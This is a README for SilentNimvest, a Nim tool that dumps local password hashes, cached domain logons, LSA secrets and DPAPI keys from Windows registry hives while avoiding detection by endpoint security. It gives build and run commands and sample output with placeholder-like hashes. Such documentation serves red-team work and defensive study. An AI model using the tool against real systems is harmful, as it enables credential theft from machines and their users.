# SilentNimvest
Basically, SilentNimvest is a SAM and Security Hives parser written in Nim. SilentNimvest reads keys under these hives by using the Silent Harvest technique. With this technique, rather than a SYSTEM-level privilege, a plain Administrator account who enables `SeBackupPrivilege` (thanks to `NtOpenKeyEx` flags) can dump the Local users' hashes, cached domain logon information, LSA Secrets, and other secrets that can be obtained from these hives
by using a less EDR-alerted registry read API which is `RegQueryMultipleValuesW`.
The whole project is based on [sud0ru's research](https://sud0ru.ghost.io/silent-harvest-extracting-windows-secrets-under-the-radar/).

# Compilation

You can directly compile the source code with the following command:

`nim c -d:release -o:SilentNimvest.exe Main.nim`

In case you get the error "cannot open file", you should also install the required dependencies:

`nimble install winim nimcrypto checksums des` 

# Usage

SilentNimvest can be executed directly without any required parameters from an elevated Administrator terminal.

```
PS C:\Users\test\Desktop\SilentNimvest> .\SilentNimvest.exe
 __ _ _            _       __ _                         _
/ _(_) | ___ _ __ | |_  /\ \ (_)_ __ _____   _____  ___| |_
\ \| | |/ _ \ '_ \| __|/  \/ / | '_ ` _ \ \ / / _ \/ __| __|
_\ \ | |  __/ | | | |_/ /\  /| | | | | | \ V /  __/\__ \ |_
\__/_|_|\___|_| |_|\__\_\ \/ |_|_| |_| |_|\_/ \___||___/\__|

                         @R0h1rr1m

[!] Trying to parse SAM Related Credentials (Local Users)

[*] Local User RID: 500 - Administrator - aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[*] Local User RID: 501 - Guest - aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[*] Local User RID: 503 - DefaultAccount - aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[*] Local User RID: 504 - WDAGUtilityAccount - aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[*] Local User RID: 1001 - zoro - aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

[!] Trying to parse Security Related Credentials (Cached Domain Logon Info, Machine Account and LSA Secrets)

[*] DPAPI Keys: dpapi_machinekey: ea31d6cfe0d16ae931b73c59d7e0c089c037b & dpapi_userkey: 44431d6cfe0d16ae931b73c59d7e0c089c0d0
[*] NL$KM: 1f31d6cfe0d16ae931b73c59d7e0c089c031d6cfe0d16ae931b73c59d7e0c089c031d6cfe0d16ae931b73c59d7e0c089c0c01
[*] Plaintext User from _SC_Backupservice: .\zoro:SilentNimvest

```

# References

- https://sud0ru.ghost.io/silent-harvest-extracting-windows-secrets-under-the-radar/
- https://github.com/GhostPack/SharpDump
- https://cocomelonc.github.io/malware/2024/06/01/malware-cryptography-28.html
